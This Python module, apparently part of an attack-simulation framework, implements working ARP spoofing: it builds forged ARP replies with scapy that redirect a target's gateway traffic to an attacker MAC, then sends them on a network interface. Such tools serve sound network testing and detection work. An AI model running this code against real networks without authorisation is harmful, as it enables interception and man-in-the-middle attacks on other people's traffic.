"""
ARP Spoofing Simulation.
Generates forged ARP replies.
"""

from typing import Dict, Any
from scapy.all import Ether, ARP, sendp # type: ignore

from .base_attack import BaseAttack

class ArpSpoofing(BaseAttack):
    """Simulates an ARP spoofing (poisoning) attack."""

    def build_packets(self, parameters: Dict[str, Any]) -> Any:
        """
        Builds forged ARP reply packets.
        
        Args:
            parameters: Must contain 'target_ip', 'spoofed_ip', 'attacker_mac'
        """
        target_ip = parameters.get("target_ip", self.config.network.target_ip)
        target_mac = parameters.get("target_mac", "ff:ff:ff:ff:ff:ff")
        spoofed_ip = parameters.get("spoofed_ip", self.config.network.gateway_ip)
        attacker_mac = parameters.get("attacker_mac", "00:11:22:33:44:55")

        self.logger.debug(f"Building ARP spoof: Tell {target_ip} that {spoofed_ip} is at {attacker_mac}")
        
        # ARP op=2 is reply
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=attacker_mac)
        return packet

    def send_packets(self, packets: Any, parameters: Dict[str, Any]) -> None:
        """Override to use Layer 2 sendp() for ARP."""
        count = parameters.get("count", 5)
        interface = self.config.network.interface
        
        self.logger.info(f"Sending {count} ARP replies on {interface}")
        sendp(packets, iface=interface, count=count, inter=0.5, verbose=False)
